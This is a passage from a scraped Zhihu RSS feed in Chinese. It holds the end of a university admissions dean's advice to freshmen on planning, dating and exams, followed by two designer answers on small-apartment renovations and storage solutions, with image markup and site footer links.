MIT，现在在全球最顶尖的一个数据分析公司工作。二是不要从众，不要看别人干了什么自己也跟着去干，在做出决定之前，问问自己的内心，到底想要什么？这个选择是离目标更近了，还是更远了？等等。</p>\n<p>除了规划和选择之外，我要提的最重要的一个建议，就是谈恋爱的问题。从上大学的第一天开始，就要旗帜鲜明地把谈恋爱列为重要的目标之一。很多家长反对，最主要的原因是怕谈恋爱影响学习。这里恐怕混淆了大学学习和中学学习的概念。大学的学习不只是文化课的学习，而是更全面的社会生活的学习。恋爱、婚姻家庭是一个人一生中非常重要的部分，不在大学里学习，什么时候学习呢？我见到了太多优秀的学生，尤其是女生，上大学的时候一直是听爸爸妈妈话的乖乖女，埋头学习，不谈恋爱，等到工作以后，在父母的逼迫下凑合找一个，导致婚姻不幸。婚姻是要建立在了解和爱的基础上的，特别是识别人的能力很重要。不谈恋爱，不知道和异性如何交流和相处，怎么可能找到让自己幸福的伴侣呢？</p>\n<p>最后，作为一个不会考试的考试院长，还是和同学们谈谈应对考试的事情，要不然知乎的同学该不放过我了。有些“金句“在大学里面广为流传，什么“六十分万岁，多一分浪费”、“怎么期末越近，我心越浪“，这是很多大学生面对考试的态度，我知道同学们在高中三年的学习非常辛苦，但是我们不能进入大学之后就“刀枪入库，马放南山”。当你进入大学之后仍然需要如饥似渴地学习，但这时候的学习是全方位的学习，是听从自己内心的学习，是为你自己为国家为社会而学习。另一方面，同学们也不能把全部的精力都投入到为了绩点而奋斗的课本学习当中，那样就浪费了珍贵的大学时光，太可惜了。记住，从开学第一天起，你就离开了爸爸妈妈，成为一个真正独立的个体了。大学是你第一次独立生活的开始，大学也是一个让你接受教育并发现自己的地方，是一个让你获得第二次生命的地方。你可以自主选择你想走的道路，你可以自主选择和谁一起走，也能够承担这种选择带来的一切后果。自此之后，你还会经历数不清的考试，但那些考试，需要你运用在大学里学到的所有东西去认真面对，祝你们都能取得好成绩！Good Luck!</p>\n<p>谢谢大家！</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bei-da-qin-chun-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">北大秦春华</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/331077570/answer/2112001535?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">956 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/304706998?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">大学生应当怎样规划自己的大学生活？</a><br><a href=\"http://www.zhihu.com/question/316623814?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样才能高质量的过完大学四年？</a><br>\n","link":"http://www.zhihu.com/question/331077570/answer/2112001535?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"小户型怎么设计，才能增大收纳储物空间？","date":"2021-09-09 11:22:54","description":"\n<p></p>\n<p>所谓小户型其实是一个模糊的概念，它的面积标准通常也是不同的：北京30至50平方米；上海60至70平方米；福州60平方米左右；武汉50至60平方米，广州50至60平方米；境外例如日本的东京、香港的中环，面积多在40平方米左右。时至今日，小户型丰富多样，功能完善，很多小户型在提高其使用率、性价比高、居住舒适度，健康住宅的标准在一定程度上也得到提高。</p>\n<p>简洁舒适、经济实用是现代都市年轻人对私人生活空间的理解，这中间包括了经济薄弱、家庭成员简单、日常很多活动在公共空间完成等等诸多缘由，因而对空间功能要求可以不那么齐全。某种意义上说，小户型只要设计合理，面积缩小但功能不减，仍然可以烘托出高质量的生活氛围。</p>\n<p><br></p>\n<p><b>下面就给大家分享一个30平米的改造的小户型，如何巧用收纳。</b></p>\n<p><br></p>\n<p><b>原始户型痛点：</b></p>\n<p>①客厅空间局促，吃饭只是放一张小小的餐桌就转不开身，更别提请朋友来家里聚会；</p>\n<p>②收纳空间不足，整屋陈设杂乱；</p>\n<p>③卫生间只要一洗澡，水就溅得地面到处都是，有安全隐患；</p>\n<p>④原来的阳台是开放式阳台，每到冬季室内都觉得潮湿阴冷。</p>\n<p><br></p>\n<p>下抛2张原始户型改造之前的<b>客厅和洗手间。</b>应该是典型的老破小户型了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7dbe5bb3b09f6a3b2c31ae80cf2513c3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1439\" data-watermark=\"watermark\" data-original-src=\"v2-7dbe5bb3b09f6a3b2c31ae80cf2513c3\" data-watermark-src=\"v2-d3d13de30288364de6dd65d4a1318138\" data-private-watermark-src=\"v2-ec67c49680de0a955e2192419894996f\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-018c92b8d1afe8a0df194cd353093db0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1077\" data-rawheight=\"1437\" data-watermark=\"watermark\" data-original-src=\"v2-018c92b8d1afe8a0df194cd353093db0\" data-watermark-src=\"v2-a1f4fc6e376ae303d148ca96c76afdcb\" data-private-watermark-src=\"v2-b49fefcc03ea84ebd0af411f1dc78fac\"></p>\n<p><br></p>\n<p><b>改造亮点：</b></p>\n<p>①拆改墙体，不破不立，1室1厅改2室1厅；</p>\n<p>②客厅一室两用，沙发当床，秒变卧室；</p>\n<p>③扩大厨房空间，保障操作需求；</p>\n<p>④利用沙发旁侧空位，挤出次卧空间；</p>\n<p>⑤增设大量收纳空间，归置家里零碎物品；</p>\n<p>⑥卫生间实现干湿分离，美观实用；</p>\n<p>⑦全屋铺设地暖，告别冬季阴冷潮湿；</p>\n<p>⑧开放式阳台改为封闭式，保温效果大大提升。</p>\n<p><br></p>\n<p><b>客厅  </b>（一室变两室）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2edf9476e7eada9363d273adf08c5807_720w.jpg?rss\" data-caption=\"设计将一室变为两用 ，客厅沙发电视的日常家居生活休闲区\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-2edf9476e7eada9363d273adf08c5807\" data-watermark-src=\"v2-b94c7616a6fa750f62e0b86cc048c50b\" data-private-watermark-src=\"v2-97b5b7ad45adddd7ba591d4b6041137a\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-afb4f5763f62a3f6bb2bcabface9efcf_720w.jpg?rss\" data-caption=\"客厅的的沙发是L型沙发，次卧的床正好连接了客厅的沙发，使其“L”巧变 “U&amp;quot;型。 增加了招待亲朋好友的聚会座位空间。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-afb4f5763f62a3f6bb2bcabface9efcf\" data-watermark-src=\"v2-1068b06e49d019ba1b7a86d5e9d717c3\" data-private-watermark-src=\"v2-b43b03de13f69efd86f65bc85d2e5927\"></p>\n<p><br></p>\n<p><b>次 卧</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b468e15fbd240f87d79db170df9e5789_720w.jpg?rss\" data-caption=\" 另一侧靠窗的位置增加了次卧 ，床头贴心的安装了储物柜，可以放置换季的被褥。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-b468e15fbd240f87d79db170df9e5789\" data-watermark-src=\"v2-68f18878a8b605aaadd17ca9baf05b01\" data-private-watermark-src=\"v2-8f86b070cbe6a91d790b99f4f26e97a0\"></p>\n<p><br></p>\n<p><b>厨 房 </b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-22bc4737e614dacd4b975ce9a7e1135c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"776\" data-watermark=\"watermark\" data-original-src=\"v2-22bc4737e614dacd4b975ce9a7e1135c\" data-watermark-src=\"v2-d460b0b81881e898804f20ae458c2c53\" data-private-watermark-src=\"v2-21d6631e4e870ca7b4b5aca95c8c5d93\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e83fcd200950475f123a2a27305a9b4f_720w.jpg?rss\" data-caption=\"厨房增加了上、下的储物柜。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1595\" data-watermark=\"watermark\" data-original-src=\"v2-e83fcd200950475f123a2a27305a9b4f\" data-watermark-src=\"v2-e74d29efc7be736276da535d12a8d6ed\" data-private-watermark-src=\"v2-a184ff687cb291201e708f7318b33d93\"></p>\n<p><br></p>\n<p><b>主 卧</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-550cf7719e2e743da7722ec078cb07e3_720w.jpg?rss\" data-caption=\"客厅另一侧是主卧，中间用储物柜做了隔离，既保障了透光又满足了储物的需求。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"674\" data-watermark=\"watermark\" data-original-src=\"v2-550cf7719e2e743da7722ec078cb07e3\" data-watermark-src=\"v2-3245ad5ff7e7c2506e6f6c94a4a25388\" data-private-watermark-src=\"v2-fa33de303438b41c76663dafd9f1042c\"></p>\n<p><br></p>\n<p><b>阳 台</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bf11f03e54b196d188162f57b9a5c9bc_720w.jpg?rss\" data-caption=\"主卧的阳台放置了洗手台和洗衣机，方便晾晒衣物。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"765\" data-watermark=\"watermark\" data-original-src=\"v2-bf11f03e54b196d188162f57b9a5c9bc\" data-watermark-src=\"v2-7724166df27847b847cc54a2793e377c\" data-private-watermark-src=\"v2-c15c4bb3e44b7b81c727aa775974028e\"></p>\n<p><br></p>\n<p><b>书桌台</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e62d14e8207a3ec6ce4cad616b5d866f_720w.jpg?rss\" data-caption=\"阳台另一角做了 书桌台 ，另一层做了大面积的储物柜，方便衣物和杂物的储藏空间。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"779\" data-watermark=\"watermark\" data-original-src=\"v2-e62d14e8207a3ec6ce4cad616b5d866f\" data-watermark-src=\"v2-d608f38088a2098cf77023d50023a362\" data-private-watermark-src=\"v2-1d20e0cf1ab01810acd41900365f8c43\"></p>\n<p><br></p>\n<p><b>洗手间</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c9919f2119e2cff3a6ae210d733d243e_720w.jpg?rss\" data-caption=\"干湿分离的洗手间看起来更整洁\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"watermark\" data-original-src=\"v2-c9919f2119e2cff3a6ae210d733d243e\" data-watermark-src=\"v2-e67b9b92762300dd72790ca12a4742a7\" data-private-watermark-src=\"v2-fb030b775cf828d69a49ea82ca61d11b\"></p>\n<p><br></p>\n<p><b>原始户型  VS  改造后布局</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-965db9f6c5374ff7e38bc49dca3799d2_720w.jpg?rss\" data-caption=\"原始户型  VS  改造后布局\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"605\" data-watermark=\"watermark\" data-original-src=\"v2-965db9f6c5374ff7e38bc49dca3799d2\" data-watermark-src=\"v2-3240cb24da471d2b237e614538cf0b50\" data-private-watermark-src=\"v2-e0eaf21235ce887bd7607e837279d78e\"></p>\n<p><br></p>\n<p>最后再放两张对比图， 来感受一下前后不同的气质吧 ！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-003a9a03776bd6b006fe88eeddc85678_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2217\" data-watermark=\"watermark\" data-original-src=\"v2-003a9a03776bd6b006fe88eeddc85678\" data-watermark-src=\"v2-9823f301a3b8e5d4c7c0dc7467351234\" data-private-watermark-src=\"v2-5549d98302e6591dfa1291139c09af19\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-8922062fd4ff6487d4c95d597501d5cf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2179\" data-rawheight=\"1619\" data-watermark=\"watermark\" data-original-src=\"v2-8922062fd4ff6487d4c95d597501d5cf\" data-watermark-src=\"v2-60c3f6baa485146ee854ab4b1dc8d1e8\" data-private-watermark-src=\"v2-08049ea9807beb24b990ac87d80b8bb2\"></p>\n<p><br></p>\n<p>这间面积“迷你”的房屋整体翻新，让这座充满时光印记的老房子焕发新生，驻足其间，清风拂面，我想，这才是家该有的模样。</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/446526971/answer/2072180951?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">105 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/420620884?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型如何设计增大储物收纳空间？</a><br><a href=\"http://www.zhihu.com/question/348943705?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型怎么设计啊 客厅太小了？</a><br>\n","link":"http://www.zhihu.com/question/446526971/answer/2072180951?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"极致收纳的家是什么样的？","date":"2021-09-09 11:22:40","description":"\n<p><b>家不需要很大。</b></p>\n<p>有限的空间里，只要能够载满所需的温情，所依赖的功能，能够熟悉，能够独处，也能够互动，能够包容，能够依据时间的变化，人的变化，联动空间的自然变化，就已经很好，已经足够。</p>\n<p>这样的家是温暖的，充满未来延展的，哪怕它很小。</p>\n<p><br></p>\n<p><b>项目概况</b></p>\n<p>住宅类型：私宅</p>\n<p>家庭成员：6人</p>\n<p>套内面积：56M²</p>\n<p>空间格局：三室一厅</p>\n<p><br></p>\n<p><b>客户需求</b></p>\n<p><br></p>\n<p>该住宅常住夫妻二人与两个活泼可爱的女儿，由于工作繁忙，双方老人会交替过来帮助照顾孩子，由于空间格局与居住需求不符，因此，男女主人希望改造后：</p>\n<p><br></p>\n<p>一、     需要三个独立的休息空间；</p>\n<p>二、     拥有充足的储物空间；</p>\n<p>三、     独立办公以及尽可能开敞的位置；</p>\n<p>四、     分离式的洗手间。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-567c94cd3a0be892b77af823ea0b4ac1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"661\" data-watermark=\"watermark\" data-original-src=\"v2-567c94cd3a0be892b77af823ea0b4ac1\" data-watermark-src=\"v2-e7d61f3e079d4f43fd15fe328f3703d3\" data-private-watermark-src=\"v2-db0b4e223fff45618ba839edf1824401\"></p>\n<p><b>原始平面图</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6de3113e072ae53316f1966978f16c53_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"668\" data-watermark=\"watermark\" data-original-src=\"v2-6de3113e072ae53316f1966978f16c53\" data-watermark-src=\"v2-082ceebb6c0b1bfb46db493686f85e01\" data-private-watermark-src=\"v2-cc1d95371b331be8ea6e0d626484a0ac\"></p>\n<p><b>平面布局图</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-33dcec97d072a0d60b28ee6a52cd734b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"668\" data-watermark=\"watermark\" data-original-src=\"v2-33dcec97d072a0d60b28ee6a52cd734b\" data-watermark-src=\"v2-2d27006cde31988ff18e6c60fa11b71f\" data-private-watermark-src=\"v2-1e1b56cf7d91071c2b7a6e3eae4da944\"></p>\n<p><b>未来空间可变性示意图</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8031ac6f23b55d9544cd21b2b6e8195e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"769\" data-watermark=\"watermark\" data-original-src=\"v2-8031ac6f23b55d9544cd21b2b6e8195e\" data-watermark-src=\"v2-4aff9667af7aab792b8124265cb98c8f\" data-private-watermark-src=\"v2-4864607e58c7e91da0f79aa76c204a87\"></p>\n<p><b>收纳面积占地示意图</b></p>\n<p><br></p>\n<p><b>入户：</b></p>\n<p><br></p>\n<p>常说<b>“麻雀虽小，五脏俱全”</b>一个合格的小户型也应该是这样，从入户的时候开始，鞋柜便已满足当季常用鞋子的收纳，方便随时换取，而开放格功能则更好的照顾到随手放置的物品。<br></p>\n<p>开放格下方的小抽屉，可以将钥匙、水电卡、身份证等随时可用的物品进行收纳管理，更及时，也更不易丢失。</p>\n<p><br></p>\n<p>入户开始，收纳便一一各安其位，而业主作息线与收纳线合二为一的设计，将贯穿整个空间。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b516357377e6b46b4023dc0a50c424f8_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"718\" data-watermark=\"watermark\" data-original-src=\"v2-b516357377e6b46b4023dc0a50c424f8\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>家政间：</b></p>\n<p><br></p>\n<p>空间的拥挤极大的提升了空间内每一平方的应用率，家政间通过土间分割而来，烘干机与洗衣机并列排放，达成<b>“综合功能区”</b>的作用，更大的鞋柜用以存放平时穿不到或不合季节的鞋子，衣柜上下方的收纳，最大程度化应用了每一分寸的空间，将<b>“收纳”</b>发挥到极致。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a8c55e3848324539bfe94057ff760213_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"853\" data-watermark=\"watermark\" data-original-src=\"v2-a8c55e3848324539bfe94057ff760213\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0e2561f8171cd7fc2a00c9f36a707aab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"watermark\" data-original-src=\"v2-0e2561f8171cd7fc2a00c9f36a707aab\" data-watermark-src=\"v2-077249d524fbf05f90c14d1d31c51c3b\" data-private-watermark-src=\"v2-988458c5eca705d4f91c83afac22909f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-927c870d3607cbaeb48cf2a773d87f39_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"watermark\" data-original-src=\"v2-927c870d3607cbaeb48cf2a773d87f39\" data-watermark-src=\"v2-7ce14feb4df7d9aef6b0035bbbf1355e\" data-private-watermark-src=\"v2-aeb4a81647c7988eb9a6928937e8a08a\"></p>\n<p><br></p>\n<p><b>客厅：</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9f051f4c429df39e7a87a174741e30bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-9f051f4c429df39e7a87a174741e30bf\" data-watermark-src=\"v2-053e75ac834d8ceeef92295f92cf4fc7\" data-private-watermark-src=\"v2-3c4bd6795b7aaebfb0e2d2bf22a8d24d\"></p>\n<p><b>原始客厅</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5c64243e1558d05915dae30fac02f287_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"490\" data-watermark=\"watermark\" data-original-src=\"v2-5c64243e1558d05915dae30fac02f287\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0c1c08e14040fdf929c71d2ee5dbb716_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-0c1c08e14040fdf929c71d2ee5dbb716\" data-watermark-src=\"v2-4d15bb5f12facfd751c09e5339a96977\" data-private-watermark-src=\"v2-df5e3bd044c3b8af69520afb9ba7c97d\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d651dcb84f411ef0a64001bed38b62c8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-d651dcb84f411ef0a64001bed38b62c8\" data-watermark-src=\"v2-7395ddb230f95e364137dbba34e49d4f\" data-private-watermark-src=\"v2-08c1794af21a6ccf3b3de7ff07d738a0\"></p>\n<p><b>改造后客厅</b></p>\n<p><br></p>\n<p>改造前的整体格局拥挤狭小，老人、孩子、家人的东西全部摆放在一起，杂乱无章，恒田设计师Ryan王恒将客厅空间再度细化，将两室一厅通过玻璃门与窗帘的形式切割为三室一厅，其中便包括主卧部分。</p>\n<p><b>使其对应功能更为精准，收纳更加清晰，同时，玻璃门与窗帘分别对应采光需求与隐私保障，既照顾到空间的需求，更考虑人的感受。</b></p>\n<p>当然，这样设计还考虑到未来人的变动，当老人不再同住时，老人的卧室便可作为主卧存在，而客厅只需将玻璃门与窗帘打开，原主卧稍作整理，便可以释放出更大的供一家四口活动的客厅空间，既方便随时的调整，又照顾未来的变迁。</p>\n<p>人多面积小的情况下，收纳应是无处不在，但难题在于，收纳的位置不能过于明显，在客厅的位置，特别定制的沙发卡座设计便较为隐秘的解决了这一需求，它释放出更大的空间，用来存放手头零散的小物件，避免狭小空间内来回走动的繁琐。</p>\n<p>沙发上侧，利用沙发靠背顶边及墙面空余空间，竖立一座书架，当主人与孩子坐在沙发上休憩玩耍时，伸出手臂，便可以取到一本寓教于乐的书籍讲给孩子听，沙发外空敞区域不设置茶几，众所周知，茶几棱角鲜明，材质多为玻璃、石材，并占用一定的空间。</p>\n<p>它的设计像书架、单人沙发、钢琴一样，六口之家，最浓最炽热的爱一般通通聚集在孩子身上，或是为互动，或是为学习，或是为安全。</p>\n<p><br></p>\n<p><b>这对于一个温暖的小家来说，这样的空间，留给孩子，留给未来，有些留白，难道不更好？</b></p>\n<p><br></p>\n<p><b>餐厅：</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a63881a332e96785b033318e24cf3764_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-a63881a332e96785b033318e24cf3764\" data-watermark-src=\"v2-a04b1e7ca197c4291b3e9056be1df9cd\" data-private-watermark-src=\"v2-5bb42c6864f5c7be4addcbbbdf76a361\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e000c77db0b4f3369ad8aaf9baac6e8f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1083\" data-watermark=\"watermark\" data-original-src=\"v2-e000c77db0b4f3369ad8aaf9baac6e8f\" data-watermark-src=\"v2-23bf62292ee36126b6a57d2adc01088d\" data-private-watermark-src=\"v2-7294967009681e03a2f9d98395bab01c\"></p>\n<p><br></p>\n<p>餐厅整体的设计，简约而惬意，长方形的形状更利于多人同时就餐，餐厅一旁开放的柜体，既可以充当西厨水吧，给生活另一种打开的姿势，又兼具餐边柜的作用，无论是放置微波炉等常用电器，还是水杯，茶壶等，都有相得益彰的妙处。</p>\n<p>柜体一旁设有单独水槽，常言<b>：“饭前便后要洗手”，</b>这样的设计使主人一家共进餐之前免去到卫生间及厨房才能洗手的现状，更利于家长<b>“现身说法”</b>，通过<b>“言传身教”，</b>从小培养孩子健康的生活习惯。</p>\n<p><br></p>\n<p><b>厨房：</b><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-742aafff410b9de7200288a35212d3b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-742aafff410b9de7200288a35212d3b7\" data-watermark-src=\"v2-7839f855aed6d2f9c979135663f07db5\" data-private-watermark-src=\"v2-641cb3620400fb91e67fc0e0dc91c018\"></p>\n<p><b>原始厨房</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-011f583e6cbd41e03fc518093dc1b8a5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-011f583e6cbd41e03fc518093dc1b8a5\" data-watermark-src=\"v2-906f5b5b08f201a7c28407c0a7dc7618\" data-private-watermark-src=\"v2-62ab2d65d5d293399554ba4154fb61eb\"></p>\n<p><b>改造后厨房</b></p>\n<p><br></p>\n<p>做饭对于常人而言，是一件充满“炊烟”的事情，炊烟里藏着温度，也藏着压抑。</p>\n<p>改造前的厨房更是如此 —— 物品摆放杂乱，空间狭小，光线昏暗，一体的橱柜，改造后，设计师以独到专业的设计，展现了一个完美的厨房空间。</p>\n<p>设计师Ryan王恒考虑到业主家中老人居住的情况，在保留封闭式厨房更易中式烹饪的同时，打开墙面的开窗，既保障厨房内的油烟不会过度溢出，又使开放空间与闭塞的厨房产生互动，使做饭时的温度与压抑，得到一定的解放。</p>\n<p><b>同时它还利于做饭的父母在厨房空间内便可随时观察到客厅玩耍的孩子，在自己的视线可控范围内，保护孩子的安全。</b></p>\n<p>在这个基础之上，又因空间有限的客观因素，为保证空间使用的流畅与舒适，将冰箱、干货柜等可以储存食材的功能归置于餐厅，将常用的厨具通过五金挂件妥帖存置，让厨房本身像一个<b>“永动机”</b>一样，在<b>洗，切，炒，</b>的动线中，保持良性循环。</p>\n<p><br></p>\n<p><b>主卧：</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d9dc8727c03c9fb4ab76f4838456c754_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-d9dc8727c03c9fb4ab76f4838456c754\" data-watermark-src=\"v2-69892d55c4ab3d1f53b4fad108456a5f\" data-private-watermark-src=\"v2-3105955e58156abd10c4631bb85a81dd\"></p>\n<p><b>原始卧室</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d14f815f50e03453b238124147ea2d6d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-d14f815f50e03453b238124147ea2d6d\" data-watermark-src=\"v2-e097843875b1b97011daeef5aa43f159\" data-private-watermark-src=\"v2-cb09fc0385e50c3d8a4d4c164171500e\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-05fddad50a0aba5fe4e88a109d068d8b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-05fddad50a0aba5fe4e88a109d068d8b\" data-watermark-src=\"v2-35ee54802944b112f26a5268462b7d28\" data-private-watermark-src=\"v2-1b6bdb04e5fc5561003afc7f5fc1b705\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-36dad57bb4cba854b6f121407a689584_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-36dad57bb4cba854b6f121407a689584\" data-watermark-src=\"v2-77d8ddfa2afa7345ec5e0beb7ea5691f\" data-private-watermark-src=\"v2-ea9ac88fdebbaf8e53b33fa803b15032\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2cd19597538c523db0db7ee2740ff1b3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-2cd19597538c523db0db7ee2740ff1b3\" data-watermark-src=\"v2-eeca81f9f228f4933ec7eb3c28782848\" 